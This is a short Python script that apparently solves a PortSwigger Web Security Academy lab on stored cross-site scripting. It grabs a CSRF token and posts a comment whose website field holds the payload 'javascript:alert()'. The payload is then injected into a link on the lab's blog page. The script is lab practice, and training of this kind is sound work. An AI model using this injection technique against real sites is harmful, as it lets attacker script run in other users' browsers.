#https://portswigger.net/web-security/cross-site-scripting/contexts/lab-href-attribute-double-quotes-html-encoded

from utils import *
url="https://0acd000004ec82ae81b1576600fe0045.web-security-academy.net/"
extension="post?postId=9"

session=requests.Session()
response=session.get(url+extension)
soup=parse_html(response)
token = soup.find('input', {'name': 'csrf'})["value"]
data={
    "csrf":token,
    "postId":"9",
    "comment":"forskyrim",
    "name":"sixtyminutesman",
    "email":"john@donte",
    "website":"javascript:alert()"
}

comment_url="https://0acd000004ec82ae81b1576600fe0045.web-security-academy.net/"
extension="/post/comment"
response=session.post(comment_url+extension,data)

response=session.get(url)

soup=parse_html(response)
link=soup.find("a",href="javascript:alert()")
response=session.get(link)
#this will solve the lab but you probably will have to either use selenium or head to the website by the browser and click the added comment
#print(check_succes(parse_html(response)))
